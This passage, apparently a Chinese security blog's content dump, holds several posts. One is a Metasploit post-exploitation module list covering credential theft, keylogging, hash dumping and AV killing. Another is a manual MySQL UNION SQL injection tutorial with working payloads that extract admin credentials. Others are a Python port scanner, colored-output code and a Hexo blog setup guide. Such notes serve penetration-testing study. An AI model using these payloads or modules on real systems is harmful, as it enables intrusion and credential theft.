0day。schtasksabuse.rb #通过调度和运行针对一个或多个目标的命令列表来在Windows中滥用调度程序服务的Meterpreter脚本。使用schtasks命令将其作为系统运行。此脚本适用于Windows XP，Windows 2003，Windows Vista和Windows 2008。scraper.rb #此脚本的目标是通过现有的Meterpreter会话从受害者获取系统信息。screenspy.rb #此脚本将打开远程主机的交互视图。您将需要在您的机器上安装Firefox。screen_unlock.rb #解锁Windows屏幕的脚本。需要系统特权才能运行和已知的目标系统的签名。screen_dwld.rb #递归搜索和下载与给定模式匹配的文件的脚本。service_manager.rb #用于管理Windows服务的脚本。service_permissions_escalate.rb此脚本尝试创建一个服务，然后通过现有服务列表进行搜索，以查找不安全的文件或配置权限，使其可以用有效载荷替换可执行文件。然后它将尝试重新启动替换的服务以运行有效载荷。如果失败，下次启动服务（例如重新启动），攻击者将获得提升的权限。sound_recorder.rb #用于以间隔录制由目标主机麦克风捕获的声音的脚本。srt_webdrive_priv.rb #利用South River Technologies WebDrive中的权限升级漏洞。uploadexec.rb #将可执行文件上传到主机的脚本。virtualbox_sysenter_dos #脚本到DoS虚拟框。virusscan_bypass.rb #杀死McAfee VirusScan Enterprise v8.7.0i +进程的脚本。vnc.rb #用于获取快速VNC会话的Meterpreter脚本。webcam.rb #从主机摄像头启用和捕获图像的脚本。win32-sshclient.rb #部署和运行“plink”命令行ssh-client的脚本。仅支持MS-Windows-2k / XP / Vista主机。win32-sshserver.rb #在目标机器上部署和运行OpenSSH的脚本。winbf.rb #检查当前系统密码策略的功能。此策略可能类似于目标环境中其他服务器的策略。winenum.rb #枚举Windows系统，包括环境变量，网络接口，路由，用户帐户等wmic.rb #用于在Windows 2003，Windows Vista和Windows XP和Windows 2008目标上运行WMIC命令的脚本。 后渗透攻击模块 (Post) 在meterpreter下按两下tab键，有几百个post模块，可以多尝试使用 以下内容均有Google自动翻译，如有错误请查看源文件 模块信息1info 模块名 使用方法1234run 模块名example:run post/windows/gather/enum_logged_on_users #目标主机当前在线的用户(SID=500是管理员账号) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179post/multi/gather/env 目标主机环境变量信息post/multi/gather/firefox_creds 目标主机火狐浏览器保存的账号密码post/multi/gather/ssh_creds 目标主机保存的ssh身份验证信息(linux系统常用)post/windows/capture/keylog_recorder Windows捕获击键记录器post/windows/capture/lockout_keylogger Windows捕获Winlogon锁定证书键盘记录器post/windows/escalate/droplnk Windows升级SMB图标LNK Dropperpost/windows/escalate/getsystem Windows通过管理员升级获取系统post/windows/escalate/golden_ticket Windows升级金票post/windows/escalate/ms10_073_kbdlayout Windows Escalate NtUserLoadKeyboardLayoutEx特权升级post/windows/escalate/screen_unlock Windows Escalate Locked Desktop Unlockerpost/windows/gather/ad_to_sqlite AD计算机，组和本地SQLite DB的递归用户成员资格post/windows/gather/arp_scanner Windows收集ARP扫描器post/windows/gather/bitcoin_jacker Windows收集比特币钱包post/windows/gather/bitlocker_fvek Bitlocker主键（FVEK）提取post/windows/gather/cachedump Windows收集凭证缓存转储post/windows/gather/checkvm Windows收集虚拟环境检测post/windows/gather/credentials/avira_password Windows收集Avira密码提取post/windows/gather/credentials/bulletproof_ftp Windows收集BulletProver FTP客户端保存的密码提取post/windows/gather/credentials/coreftp Windows收集CoreFTP保存的密码提取post/windows/gather/credentials/credential_collector Windows收集凭证收集器post/windows/gather/credentials/domain_hashdump Windows域控制器Hashdumppost/windows/gather/credentials/dynazip_log Windows收集DynaZIP保存的密码提取post/windows/gather/credentials/dyndns Windows收集DynDNS客户端密码提取器post/windows/gather/credentials/enum_cred_store Windows收集证书存储枚举和解密模块post/windows/gather/credentials/enum_laps Windows收集证书本地管理员密码解决方案post/windows/gather/credentials/enum_picasa_pwds Windows收集Google Picasa密码提取器post/windows/gather/credentials/epo_sql Windows收集McAfee ePO 4.6配置SQL凭据post/windows/gather/credentials/filezilla_server Windows收集FileZilla FTP服务器凭据集合post/windows/gather/credentials/flashfxp Windows收集FlashFXP保存的密码提取post/windows/gather/credentials/ftpnavigator Windows收集FTP导航器保存密码提取post/windows/gather/credentials/ftpx Windows收集FTP资源管理器（FTPX）凭据提取post/windows/gather/credentials/gpp Windows收集组策略优先保存的密码post/windows/gather/credentials/heidisql Windows收集HeidiSQL保存的密码提取post/windows/gather/credentials/idm Windows收集Internet下载管理器（IDM）密码提取器post/windows/gather/credentials/imail Windows收集IPSwitch iMail用户数据枚举post/windows/gather/credentials/imvu Windows收集证书IMVU游戏客户端post/windows/gather/credentials/mcafee_vse_hashdump McAfee病毒扫描企业密码破解转储post/windows/gather/credentials/mdaemon_cred_collector Windows收集MDaemonEmailServer证书破解post/windows/gather/credentials/meebo Windows收集Meebo密码提取器post/windows/gather/credentials/mremote Windows收集mRemote保存的密码提取post/windows/gather/credentials/mssql_local_hashdump Windows收集本地SQL Server哈希转储post/windows/gather/credentials/nimbuzz Windows收集Nimbuzz Instant Messenger密码提取器post/windows/gather/credentials/outlook Windows收集Microsoft Outlook保存的密码提取post/windows/gather/credentials/razer_synapse Windows收集Razer Synapse密码提取post/windows/gather/credentials/razorsql Windows收集RazorSQL证书post/windows/gather/credentials/rdc_manager_creds Windows收集远程桌面连接管理器保存的密码提取post/windows/gather/credentials/skype Windows收集Skype保存的密码哈希提取post/windows/gather/credentials/smartermail Windows收集更智能的邮件密码提取post/windows/gather/credentials/smartftp Windows收集SmartFTP保存的密码提取post/windows/gather/credentials/spark_im Windows收集Spark IM密码提取post/windows/gather/credentials/sso Windows单一登录凭证收集器（Mimikatz）post/windows/gather/credentials/steam Windows收集Steam客户端会话收集器。post/windows/gather/credentials/tortoisesvn Windows收集TortoiseSVN保存的密码提取post/windows/gather/credentials/total_commander Windows收集Total Commander保存的密码提取post/windows/gather/credentials/trillian Windows收集Trillian密码提取器post/windows/gather/credentials/vnc Windows收集VNC密码提取post/windows/gather/credentials/windows_autologin Windows收集AutoLogin用户凭据提取器post/windows/gather/credentials/winscp Windows收集WinSCP保存的密码提取post/windows/gather/credentials/wsftp_client Windows收集WS_FTP保存的密码提取post/windows/gather/dnscache_dump Windows收集DNS缓存post/windows/gather/dumplinks Windows收集最近的文件lnk信息post/windows/gather/enum_ad_bitlocker Windows收集Active Directory BitLocker恢复post/windows/gather/enum_ad_computers Windows收集Active Directory计算机post/windows/gather/enum_ad_groups Windows收集Active Directory组post/windows/gather/enum_ad_managedby_groups Windows收集Active Directory托管组post/windows/gather/enum_ad_service_principal_names Windows收集Active Directory服务主体名称post/windows/gather/enum_ad_to_wordlist Windows Active Directory Wordlist Builderpost/windows/gather/enum_ad_user_comments Windows收集Active Directory用户评论post/windows/gather/enum_ad_users Windows收集Active Directory用户post/windows/gather/enum_applications Windows收集安装的应用程序枚举post/windows/gather/enum_artifacts Windows收集文件和注册表伪像枚举post/windows/gather/enum_av_excluded Windows防病毒排除枚举post/windows/gather/enum_chrome Windows收集Google Chrome用户数据枚举post/windows/gather/enum_computers Windows收集枚举计算机post/windows/gather/enum_db Windows收集数据库实例枚举post/windows/gather/enum_devices Windows收集硬件枚举post/windows/gather/enum_dirperms Windows收集目录权限枚举post/windows/gather/enum_domain Windows收集枚举域post/windows/gather/enum_domain_group_users Windows收集枚举域组post/windows/gather/enum_domain_tokens Windows收集枚举域令牌post/windows/gather/enum_domain_users Windows收集枚举活动域用户post/windows/gather/enum_domains Windows收集域枚举post/windows/gather/enum_emet Windows收集EMET保护路径post/windows/gather/enum_files Windows收集通用文件集合post/windows/gather/enum_hostfile Windows收集Windows主机文件枚举post/windows/gather/enum_ie Windows收集Internet Explorer用户数据枚举post/windows/gather/enum_logged_on_users Windows收集登录用户枚举（注册表）post/windows/gather/enum_ms_product_keys Windows收集产品密钥post/windows/gather/enum_muicache Windows收集枚举用户MUICachepost/windows/gather/enum_patches Windows收集应用的补丁post/windows/gather/enum_powershell_env Windows收集Powershell环境设置枚举post/windows/gather/enum_prefetch Windows收集预取文件信息post/windows/gather/enum_proxy Windows收集代理设置post/windows/gather/enum_putty_saved_sessions PuTTY保存的会话枚举模块post/windows/gather/enum_services Windows收集服务信息枚举post/windows/gather/enum_shares Windows通过注册表收集SMB共享枚举post/windows/gather/enum_snmp Windows收集SNMP设置枚举（注册表）post/windows/gather/enum_termserv Windows收集终端服务器客户端连接信息转储post/windows/gather/enum_tokens Windows收集枚举域管理令牌（令牌猎人）post/windows/gather/enum_tomcat Windows收集Apache Tomcat枚举post/windows/gather/enum_trusted_locations Windows收集Microsoft Office信任的位置post/windows/gather/enum_unattend Windows收集无人值守的答案文件枚举post/windows/gather/file_from_raw_ntfs Windows文件从原始NTFS收集文件post/windows/gather/forensics/browser_history Windows收集Skype，Firefox和Chrome人工制品post/windows/gather/forensics/duqu_check Windows收集法医Duqu注册表检查post/windows/gather/forensics/enum_drives Windows收集物理驱动器和逻辑卷post/windows/gather/forensics/imager Windows收集法医成像post/windows/gather/forensics/nbd_server Windows收集本地NBD服务器post/windows/gather/forensics/recovery_files Windows收集删除的文件枚举和恢复post/windows/gather/hashdump Windows收集本地用户帐户密码哈希（注册表）post/windows/gather/local_admin_search_enum Windows收集本地管理员搜索post/windows/gather/lsa_secrets Windows枚举LSA秘密post/windows/gather/make_csv_orgchart 使用管理器信息生成CSV组织图数据post/windows/gather/memory_grep Windows收集过程内存Greppost/windows/gather/netlm_downgrade Windows NetLM降级攻击post/windows/gather/ntds_location 发布Windows收集NTDS.DIT位置post/windows/gather/outlook Windows收集Outlook电子邮件post/windows/gather/phish_windows_credentials Windows收集用户凭据（网络钓鱼）post/windows/gather/resolve_sid Windows收集本地用户帐户SID查找post/windows/gather/reverse_lookup Windows收集IP范围反向查找post/windows/gather/screen_spy Windows收集屏幕间谍post/windows/gather/smart_hashdump Windows收集本地和域控制器帐户密码哈希post/windows/gather/tcpnetstat Windows收集TCP Netstatpost/windows/gather/usb_history Windows收集USB驱动器历史记录post/windows/gather/win_privs Windows收集特权枚举post/windows/gather/wmic_command Windows收集运行指定的WMIC命令post/windows/gather/word_unc_injector Windows收集Microsoft Office Word UNC路径注入器post/windows/manage/add_user_domain Windows管理将用户添加到域和/或域组post/windows/manage/archmigrate 架构迁移post/windows/manage/change_password Windows管理更改密码post/windows/manage/clone_proxy_settings Windows管理代理设置克隆post/windows/manage/delete_user Windows管理本地用户帐户删除post/windows/manage/download_exec Windows管理下载和/或执行post/windows/manage/driver_loader Windows管理驱动程序加载程序post/windows/manage/enable_rdp Windows管理启用远程桌面post/windows/manage/enable_support_account Windows管理木马支持帐户post/windows/manage/exec_powershell Windows Powershell执行后期模块post/windows/manage/forward_pageant 将SSH代理请求转发到远程站点post/windows/manage/hashcarve Windows本地用户帐户哈希卡弗post/windows/manage/ie_proxypac Windows管理代理PAC文件post/windows/manage/inject_ca Windows管理证书颁发机构注入post/windows/manage/inject_host Windows管理主机文件注入post/windows/manage/killav Windows Post杀死病毒和臀部post/windows/manage/migrate Windows管理进程迁移post/windows/manage/mssql_local_auth_bypass Windows管理本地Microsoft SQL Server授权绕过post/windows/manage/multi_meterpreter_inject Windows管理在内存中注入多个有效负载post/windows/manage/nbd_server Windows远程磁盘管理本地NBD服务器post/windows/manage/payload_inject Windows管理内存有效载荷注入模块post/windows/manage/persistence_exe Windows管理持久的EXE Payload安装程序post/windows/manage/portproxy Windows管理端口转发PortProxypost/windows/manage/powershell/build_net_code Powershell .NET编译器post/windows/manage/powershell/exec_powershell Windows管理PowerShell下载和/或执行post/windows/manage/powershell/load_script 将脚本加载到PowerShell会话中post/windows/manage/pptp_tunnel Windows管理远程点对点隧道协议post/windows/manage/priv_migrate Windows管理基于权限的进程迁移post/windows/manage/pxeexploit Windows管理PXE漏洞服务器post/windows/manage/reflective_dll_inject Windows管理反射式DLL注入模块post/windows/manage/remove_ca Windows管理证书颁发机构删除post/windows/manage/remove_host Windows管理主机文件删除post/windows/manage/rpcapd_start Windows管理远程数据包捕获服务启动器post/windows/manage/run_as Windows管理运行命令作为用户post/windows/manage/run_as_psh Windows“运行”使用Powershellpost/windows/manage/sdel Windows管理安全删除post/windows/manage/sticky_keys 粘键保持模块post/windows/manage/vmdk_mount Windows管理VMDK安装驱动器post/windows/manage/vss_create Windows管理创建卷影副本post/windows/manage/vss_list Windows管理列表卷影副本post/windows/manage/vss_mount Windows管理安装阴影复制post/windows/manage/vss_set_storage Windows管理设置卷影复制存储空间post/windows/manage/vss_storage Windows管理获取卷影复制存储信息post/windows/manage/wdigest_caching Windows发布管理WDigest凭据缓存post/windows/manage/webcam Windows管理网络摄像头post/windows/recon/computer_browser_discovery Windows Recon计算机浏览器发现post/windows/recon/outbound_ports Windows出站过滤规则post/windows/recon/resolve_ip Windows Recon解析IPpost/windows/wlan/wlan_bss_list Windows收集无线BSS信息post/windows/wlan/wlan_current_connection Windows收集无线当前连接信息post/windows/wlan/wlan_disconnect Windows断开无线连接post/windows/wlan/wlan_profile Windows收集无线配置文件","categories":[],"tags":[{"name":"Metasploit-Framework","slug":"Metasploit-Framework","permalink":"https://damit5.com/tags/Metasploit-Framework/"}]},{"title":"Python实现简单端口扫描器的编写","slug":"Python实现简单端口扫描器的编写","date":"2017-09-30T05:36:55.000Z","updated":"2018-06-10T03:53:13.003Z","comments":true,"path":"2017/09/30/Python实现简单端口扫描器的编写/","link":"","permalink":"https://damit5.com/2017/09/30/Python实现简单端口扫描器的编写/","excerpt":"0×00 前言没错，这就是上个帖子所说的简单的端口扫描器 加了颜色过后确实逼格猛涨 废话不多说，开始记录下这有趣的故事","text":"0×00 前言没错，这就是上个帖子所说的简单的端口扫描器 加了颜色过后确实逼格猛涨 废话不多说，开始记录下这有趣的故事 0×01 正文Step 0 : 意淫一下写这个扫描器的思路 用户输入网址，转换为IP（直接IP也行） 传入的参数需要用 sys 来判定 需要使用socket模块来完成端口的扫描 扫描单独写一个方法 终端输出改变颜色提升逼格Step 1 : 引入我们需要的模块123import sysimport socketfrom color import * Step 2 : 扫描端口是否开启的方法 scan()设置超时时间，防止等太久1socket.setdefaulttimeout(3) 创建一个socket对象1s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) AF_INET 表示IPV4 SOCK_STREAM 表示TCP 然后用connect方法连接 PS : connect()中传入的是一个tuple1s.connect((ip,port)) Step 3 : 主函数的书写（获取IP和端口）判断是否传入正确的参数1234if len(sys.argv) == 2:else: print &apos;usage : python portscan.py &lt;url&gt;&apos; 获取传入参数的IP地址和想要扫描的端口123url = sys.argv[1]ip = socket.gethostbyname(url)portlist = [22,80,81,445,3306,3389,8080] 将端口和IP使用scan()方法进行测试123456for port in portlist: result = scan(ip,port) if result: printGreen (&apos;[+] Port %d is open&apos; %port) else: printRed (&apos;[-] Port %d is closed&apos; %port) 0×02 测试结果 new APlayer({ element: document.getElementById(\"aplayer15\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } });","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://damit5.com/tags/Python/"}]},{"title":"Python在Windows/Linux中输出彩色文字","slug":"Python在Windows-Linux中输出彩色文字","date":"2017-09-30T05:34:14.000Z","updated":"2018-06-10T03:53:41.406Z","comments":true,"path":"2017/09/30/Python在Windows-Linux中输出彩色文字/","link":"","permalink":"https://damit5.com/2017/09/30/Python在Windows-Linux中输出彩色文字/","excerpt":"Updatetime : 2018-5-7update : you can use the package colorama pip install colorama 前言本来今天开开心心的打算写一个简单的端口扫描器来学习Python的网络编程，不过终端输出完全一个颜色不仅难看而且还伤眼睛 于是乎，上网搜寻了一大堆资料，测试了一下午，没有成功（心态崩溃） 不过，还好有luan牛的帮忙 O(∩_∩)O~ win下输出彩色文字，网上有两种方法一种是用system执行命令来设置颜色，感觉还是不太好，用ctypes模块实现更好点。 linux下设置颜色，网上只找到了一种方法","text":"Updatetime : 2018-5-7update : you can use the package colorama pip install colorama 前言本来今天开开心心的打算写一个简单的端口扫描器来学习Python的网络编程，不过终端输出完全一个颜色不仅难看而且还伤眼睛 于是乎，上网搜寻了一大堆资料，测试了一下午，没有成功（心态崩溃） 不过，还好有luan牛的帮忙 O(∩_∩)O~ win下输出彩色文字，网上有两种方法一种是用system执行命令来设置颜色，感觉还是不太好，用ctypes模块实现更好点。 linux下设置颜色，网上只找到了一种方法 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import platformif &apos;Windows&apos; in platform.system(): import sys import ctypes __stdInputHandle = -10 __stdOutputHandle = -11 __stdErrorHandle = -12 __foreGroundBLUE = 0x09 __foreGroundGREEN = 0x0a __foreGroundRED = 0x0c __foreGroundYELLOW = 0x0e stdOutHandle=ctypes.windll.kernel32.GetStdHandle(__stdOutputHandle) def setCmdColor(color,handle=stdOutHandle): return ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color) def resetCmdColor(): setCmdColor(__foreGroundRED | __foreGroundGREEN | __foreGroundBLUE) def printBlue(msg): setCmdColor(__foreGroundBLUE) sys.stdout.write(msg + &apos;\\n&apos;) resetCmdColor() def printGreen(msg): setCmdColor(__foreGroundGREEN) sys.stdout.write(msg + &apos;\\n&apos;) resetCmdColor() def printRed(msg): setCmdColor(__foreGroundRED) sys.stdout.write(msg + &apos;\\n&apos;) resetCmdColor() def printYellow(msg): setCmdColor(__foreGroundYELLOW) sys.stdout.write(msg + &apos;\\n&apos;) resetCmdColor()else: STYLE = &#123; &apos;fore&apos;:&#123; &apos;red&apos;: 31, &apos;green&apos;: 32, &apos;yellow&apos;: 33, &apos;blue&apos;: 34, &#125; &#125; def UseStyle(msg, mode = &apos;&apos;, fore = &apos;&apos;, back = &apos;40&apos;): fore = &apos;%s&apos; % STYLE[&apos;fore&apos;][fore] if STYLE[&apos;fore&apos;].has_key(fore) else &apos;&apos; style = &apos;;&apos;.join([s for s in [mode, fore, back] if s]) style = &apos;\\033[%sm&apos; % style if style else &apos;&apos; end = &apos;\\033[%sm&apos; % 0 if style else &apos;&apos; return &apos;%s%s%s&apos; % (style, msg, end) def printRed(msg): print UseStyle(msg,fore=&apos;red&apos;) def printGreen(msg): print UseStyle(msg,fore=&apos;green&apos;) def printYellow(msg): print UseStyle(msg,fore=&apos;yellow&apos;) def printBlue(msg): print UseStyle(msg,fore=&apos;blue&apos;) 使用方法用起来很容易，直接from color import *就可以用了，有4种常用颜色可以使用，分别写了4个函数： 成功信息 printGreen 失败信息 printRed 提示信息 printBlue 警告信息 printYellow new APlayer({ element: document.getElementById(\"aplayer19\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } });","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"https://damit5.com/tags/Python/"}]},{"title":"MySQL+PHP手工联合查询注入","slug":"MySQL-PHP手工联合查询注入","date":"2017-09-30T05:30:42.000Z","updated":"2018-06-10T03:51:00.222Z","comments":true,"path":"2017/09/30/MySQL-PHP手工联合查询注入/","link":"","permalink":"https://damit5.com/2017/09/30/MySQL-PHP手工联合查询注入/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer4\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 学习原理，不要专注于工具","text":"new APlayer({ element: document.getElementById(\"aplayer4\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 学习原理，不要专注于工具 1.查询字段长度12order by 6#直到最后一个不满足为止 1234567#注意：如果order by 1 报错1.禁用了order by函数2.与其他函数冲突top 3.语句中已经存在order by 解决方案：order by 1 -- # -- 表示注释 2.爆出显位数字12345union select 1,2,3,4,5,6#如果未爆错则在&quot;id=?&quot;后面加一个and 0 或者？前面加一个-，让他爆出显位数字(假设为 2 和 5 )eg：php?id=-5 或者 php?id=5 and 0# &quot; - &quot;和&quot; and 0 &quot;都是为了让页面报错 3.查出数据库的名字，将显位数字更改1234version() --- 看数据库的版本database() --- 查数据库名称user() --- 查当前数据库用户的权限@@version_compile_os --- 查看操作系统版本 12UNION SELECT 1,database(),3,4,5,6#查看数据库的名称 4.查表的名字，将数据库名转换为16进制（小葵）123UNION SELECT 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=0x64767761#最后的16进制是数据库的名字（这里是dvwa）group_concat 表示爆出该数据库中所有的表的名字 5.查列的名字，将表的名字转换为16进制123UNION SELECT 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=0x61646D696E #最后的16进制是表的名字（这里是admin）前面为列名，后面是表名 6.查列的内容12UNION SELECT 1,adminName,3,4,adminPwd,6 from admin# adminName和adminPwd为查出来的列名，最后的admin为表名","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"Hello World","slug":"Hello-World","date":"2017-09-30T03:36:02.000Z","updated":"2018-06-10T03:38:25.798Z","comments":true,"path":"2017/09/30/Hello-World/","link":"","permalink":"https://damit5.com/2017/09/30/Hello-World/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer0\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 前言经过一天的努力博客终于完全完全移植了过来，听说第一篇 Hello World 是惯例，也许就是因为以前没有遵守这个惯例所以博客老GG，不管怎么样，还是写一个吧1Hello World","text":"new APlayer({ element: document.getElementById(\"aplayer0\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 前言经过一天的努力博客终于完全完全移植了过来，听说第一篇 Hello World 是惯例，也许就是因为以前没有遵守这个惯例所以博客老GG，不管怎么样，还是写一个吧1Hello World 因为在博客移植过程中也遇到了很多的坑，所以打算记录一下博客搭建的过程，也希望能为以后准备搭建博客的提供一些帮助 过程 因为我在Windows上搭建老是GG，所以干脆直接搭建在Ubuntu上，所以下列教程也适用于Ubuntu 注册GitHub账号官网创建仓库1.登陆GitHub2.点击创建仓库 3.填写仓库信息仓库名称必须是用户名.github.io（官方是这样写的，我也不知道为什么），比如我的用户名是damit5，那么我就填damit5.github.io 配置SSH1.设置user name 和 email :12git config --global user.name &quot;你的GitHub用户名&quot;git config --global user.email &quot;你的GitHub注册邮箱&quot; 2.生成ssh密钥1ssh-keygen -t rsa -C &quot;你的GitHub注册邮箱&quot; 一般这种情况下是不需要密码的，所以一直回车就好 成功后，用户文件夹下就会有一个新的文件夹 .ssh，里面就有刚刚创建的ssh密钥文件id_rsa和id_rsa_pub 注：id_rsa文件是私钥，要妥善保管，id_rsa.pub是公钥文件。 3.添加公钥到GitHub点击用户头像，然后再点击Settings选项 在用户设置栏，点击SSH and GPG keys选项，然后点击New SSH key 将 id_rsa.pub 的内容复制到Key 文本框中，再点击Add SSH key 4.测试SSH1ssh -T git@github.com 接下来会显示出下面的确认信息 123The authenticity of host &apos;github.com (192.30.255.112)&apos; can&apos;t be established.RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.Are you sure you want to continue connecting (yes/no)? 输入yes然后回车 如果显示出下面的内容则表示成功（damit5是用户名） 1Hi damit5! You&apos;ve successfully authenticated, but GitHub does not provide shell access. 安装Node.js1curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.0/install.sh | bash` 然后，将以下代码添加至到profile(~/.bash_profile， ~/.zshrc， ~/.profile， ~/.bashrc其中之一)文件中12export NVM_DIR=&quot;$HOME/.nvm&quot;[ -s &quot;$NVM_DIR/nvm.sh&quot; ] &amp;&amp; . &quot;$NVM_DIR/nvm.sh&quot; 重启终端，输入以下指令安装node最新的LTS版本 1nvm install --lts=boron 加速Node.js默认是通过npm进行包管理的，但npm官方源在国内速度那可叫一个酸爽，而且还经常抽疯，原因大家都懂的，如果没有好梯子，建议大家使用淘宝npm镜像，方法如下： 1npm install -g cnpm --registry=https://registry.npm.taobao.org 安装成功后，就可以能过以下指令加速安装相用包啦1cnpm install [PackageName] Hexo安装hexo安装好Node.js环境后，就可以通过node的npm包管理工具安装Hexo，执行以下指令(当然cnpm可以换成npm，这里使用淘宝加速) 1cnpm install hexo-cli -g hexo全局安装一次就够了，后面可以直接使用hexo相关的操作。 创建博客文件夹 在此目录下管理自己的博客源码 123mkdir blogcd blog 初始化Hexo1hexo init 安装依赖包1cnpm install 生成静态页面1hexo g 启动本地服务器1hexo s 上面2条命令也可以结合为hexo s -g 出现以下内容则说明hexo环境安装成功12INFO Start processingINFO Hexo is running at //localhost:4000/. Press Ctrl+C to stop. 部署Hexo1.编辑配置文件，关闭远程仓库编辑_config.yml,找到最后的内容123## Docs: https://hexo.io/docs/deployment.htmldeploy: type: 添加GitHub仓库信息 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:damit5/damit5.github.io.git branch: master PS: type、repo、branch的前面和后面都有2个空格 2.安装git插件1cnpm install hexo-deployer-git --save 3.部署1hexo deploy 如果没有意外，部署就成功了，可以打开 https://&lt;用户名&gt;.github.io 查看。 比如我的就是 : https://damit5.github.io/ 域名配置现在已经可以通过 https://yourname.github.io 来访问自己的博客站点啦。这时可能有人会说了，大家都通过github.io来访问，好没个性，能不能配置用自己的域名来访问自己的站点。答案当然可以。 首先，你得有个自己的域名，如果还没，那就去买个。 1.进域名控制台在解析里面添加一条CNAME记录，指向yourname.github.io即可。 2.打开项目，选择 setting 3.找到GitHub Pages （每次deploy过后都需要修改一次） 这样就可以通过自己的域名来访问了 其他基础12345678hexo new&quot;postName&quot; #新建文章hexo new page&quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo clean #清除生成内容hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #将.deploy目录部署到指定空间hexo help # 查看帮助hexo version #查看Hexo的版本 hexo 命令缩写1234hexo g：hexo generatehexo c：hexo cleanhexo s：hexo serverhexo d：hexo deploy hexo 命令组合12hexo clean &amp;&amp; hexo g -s #清除、生成、启动hexo clean &amp;&amp; hexo g -d #清除、生成、部署 1nvm install --lts=boron","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"https://damit5.com/tags/其他/"}]}]}